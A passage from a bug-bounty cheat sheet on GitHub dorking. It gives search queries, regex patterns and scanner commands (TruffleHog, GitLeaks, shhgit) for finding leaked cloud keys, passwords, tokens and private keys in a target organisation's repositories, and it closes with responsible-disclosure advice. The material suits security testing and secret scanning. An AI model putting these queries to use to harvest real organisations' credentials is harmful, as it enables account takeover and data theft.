filename:settings.py
filename:settings.json
filename:application.properties
filename:application.yml
filename:secrets.yml
filename:credentials.json
filename:credentials.xml
```

### Docker

```
# Docker configs
filename:docker-compose.yml password
filename:Dockerfile ENV
filename:.dockercfg
filename:docker-compose.yml
```

### Kubernetes

```
# K8s secrets
filename:*.yaml "kind: Secret"
filename:secrets.yaml
"kubernetes" "secret"
```

### CI/CD

```
# Jenkins
filename:Jenkinsfile password
filename:jenkins.xml

# Travis CI
filename:.travis.yml

# GitHub Actions
filename:*.yml "secrets"
path:.github/workflows

# GitLab CI
filename:.gitlab-ci.yml
```

---

## 🔍 GitHub Dorking — ☁️ Cloud Secrets

### AWS

```
# AWS Credentials File
filename:credentials aws_access_key_id
filename:.aws/credentials

# AWS Config
"aws_access_key_id"
"aws_secret_access_key"
"aws_session_token"

# S3 Buckets
"s3.amazonaws.com"
"s3-"
".s3.amazonaws.com"
```

### Azure

```
# Azure
"AZURE_CLIENT_SECRET"
"AZURE_STORAGE_CONNECTION_STRING"
"AccountKey="
"SharedAccessSignature="

# Azure DevOps
"azure" "secret"
"azure" "token"
```

### Google Cloud

```
# GCP
"GOOGLE_APPLICATION_CREDENTIALS"
"GOOGLE_API_KEY"
"GOOGLE_CLOUD_PROJECT"
filename:credentials.json "private_key"
```

### DigitalOcean

```
"DIGITALOCEAN_ACCESS_TOKEN"
"DO_AUTH_TOKEN"
"digitalocean" "token"
```

### Heroku

```
"HEROKU_API_KEY"
"HEROKU_APP_NAME"
filename:.netrc heroku
```

---

## 🔍 GitHub Dorking — 🔓 Passwords & Credentials

### Hardcoded Passwords

```
# Password variables
password=
passwd=
pass=
pwd=
"password:"
"password ="

# With values
password="
password='
"password": "
'password': '
```

### SMTP Credentials

```
# SMTP
"smtp_password"
"SMTP_PASSWORD"
"mail_password"
"EMAIL_PASSWORD"
"smtp" "password"
```

### OAuth Secrets

```
# OAuth
"client_secret"
"CLIENT_SECRET"
"oauth_token"
"OAUTH_SECRET"
"refresh_token"
```

### JWT Secrets

```
# JWT
"JWT_SECRET"
"jwt_secret"
"JWT_KEY"
"secret_key"
"SECRET_KEY"
```

### Admin Credentials

```
# Admin
"admin_password"
"root_password"
"master_password"
"default_password"
```

---

## 🔍 GitHub Dorking — 🎯 Bug Bounty Targets

### Target Organization

```
# Search specific org
org:target-company

# User repos
user:target-username

# Specific repo
repo:target/repository

# Combined with secrets
org:target-company password
org:target-company api_key
org:target-company "secret"
```

### Domain-Based Search

```
# Target domain
"target.com"
"@target.com"
"api.target.com"
"internal.target.com"

# Combined
"target.com" password
"target.com" api_key
org:target "@target.com"
```

### Employee Emails

```
# Find employee repos
"@target.com"

# Developer emails
"@target.com" password
"@target.com" config
```

### Internal URLs

```
# Internal services
"internal.target.com"
"dev.target.com"
"staging.target.com"
"admin.target.com"
"vpn.target.com"
"jira.target.com"
"confluence.target.com"
```

### Bug Bounty Dork Template

```
# Complete recon
org:TARGET filename:.env
org:TARGET filename:config.json password
org:TARGET extension:sql
org:TARGET "api_key"
org:TARGET "secret_key"
org:TARGET "password"
org:TARGET "token"
org:TARGET "AWS_ACCESS"
org:TARGET internal
"@TARGET.com" password
"TARGET.com" api_key
```

---

## 🔍 GitHub Dorking — 🔬 Advanced Techniques

### Git History Search

```
# Check commits
# (Use tools like TruffleHog, git-secrets)

# Recently pushed
pushed:>2024-01-01 password
pushed:>2024-01-01 filename:.env
```

### Gist Search

```
# Search Gists
https://gist.github.com/search?q=password+target

# Gist patterns
gist password
gist api_key
```

### Code Snippets

```
# Search in code
in:file password
in:path config

# Large files (might have more data)
size:>10000 password
```

### Regex Patterns (with tools)

```
# AWS Key Pattern
AKIA[0-9A-Z]{16}

# GitHub Token
ghp_[a-zA-Z0-9]{36}

# Slack Token
xox[baprs]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}

# Private Key
-----BEGIN [A-Z]+ PRIVATE KEY-----
```

---

## 🔍 GitHub Dorking — 🛠️ Automation Tools

### TruffleHog

```bash
# Install
pip install truffleHog

# Scan repo
trufflehog git https://github.com/target/repo

# Scan org
trufflehog git https://github.com/target --only-verified
```

### GitLeaks

```bash
# Install
brew install gitleaks

# Scan repo
gitleaks detect -s /path/to/repo

# Scan from URL
gitleaks detect --source https://github.com/target/repo

# Output JSON
gitleaks detect -s repo --report-format json -r results.json
```

### git-secrets

```bash
# Install
brew install git-secrets

# Add patterns
git secrets --add 'AKIA[A-Z0-9]{16}'
git secrets --add 'password\s*=\s*["\'][^"\']*["\']'

# Scan repo
git secrets --scan
```

### GitHub Search Tools

```bash
# GitHub Dork CLI
# Various community tools available

# GitDorker
python3 gitdorker.py -t TOKEN -org target

# gitrob
gitrob target-org
```

### shhgit

```bash
# Real-time GitHub monitoring
# Monitors for secrets in real-time
shhgit --search-query "org:target"
```

---

## 🔍 GitHub Dorking — 📊 Quick Reference

### Essential Dorks

| Purpose | Dork |
|---------|------|
| AWS Keys | `org:target AKIA` |
| Passwords | `org:target password filename:.env` |
| API Keys | `org:target api_key` |
| Private Keys | `org:target "BEGIN RSA PRIVATE KEY"` |
| Config Files | `org:target filename:config.json` |
| DB Creds | `org:target "mongodb://"` |
| Tokens | `org:target token secret` |
| Emails | `"@target.com" password` |

### File Patterns

| Pattern | Dork |
|---------|------|
| `.env` | `filename:.env` |
| Config JSON | `filename:config.json` |
| Settings | `filename:settings.py` |
| Credentials | `filename:credentials` |
| Secrets | `filename:secrets` |
| Docker | `filename:docker-compose.yml` |

### Top 15 GitHub Dorks

| # | Dork | Purpose |
|---|------|---------|
| 1 | `filename:.env DB_PASSWORD` | DB passwords |
| 2 | `filename:.env AWS_` | AWS creds |
| 3 | `"-----BEGIN RSA PRIVATE KEY-----"` | Private keys |
| 4 | `filename:config.json password` | Config passwords |
| 5 | `AKIA` | AWS Access Keys |
| 6 | `sk_live` | Stripe keys |
| 7 | `"mongodb+srv://"` | MongoDB URIs |
| 8 | `filename:credentials aws` | AWS creds file |
| 9 | `ghp_` | GitHub tokens |
| 10 | `xoxb-` | Slack tokens |
| 11 | `org:target password` | Org passwords |
| 12 | `filename:.npmrc _auth` | NPM tokens |
| 13 | `extension:sql password` | SQL dumps |
| 14 | `filename:wp-config.php` | WordPress |
| 15 | `"api_key" extension:json` | API keys |

---

## 🔍 GitHub Dorking — 💡 Tips & Best Practices

### Bug Bounty Tips

1. **Search the Organization**
   ```
   org:target-company
   ```

2. **Check Employee Repos**
   ```
   "@target.com"
   ```

3. **Look for Internal URLs**
   ```
   org:target "internal" OR "dev" OR "staging"
   ```

4. **Search Git History**
   - Use TruffleHog or GitLeaks

5. **Check Gists**
   - Developers often store snippets

### Responsible Disclosure

- **Report** findings to security team
- **Don't** access systems with found credentials
- **Don't** share credentials publicly
- **Document** your findings properly

---

## 🔍 GitHub Dorking — 📚 Resources

### Tools
- [TruffleHog](https://github.com/trufflesecurity/trufflehog)
- [GitLeaks](https://github.com/gitleaks/gitleaks)
- [git-secrets](https://github.com/awslabs/git-secrets)
- [shhgit](https://github.com/eth0izzle/shhgit)

### References
- [GitHub Search Docs](https://docs.github.com/en/search-github)
- [Secret Scanning Patterns](https://docs.github.com/en/code-security/secret-scanning)

### Related Cheatsheets
- [Google Dorking](../Google-Dorking/README.md)
- [Shodan](../Shodan/README.md)
- [Subfinder](../Subfinder/README.md)

---

<p align="center">
  <b>🐙 Find Secrets Before Attackers Do!</b><br>
  <i>Master GitHub Dorking for bug bounty</i>
</p>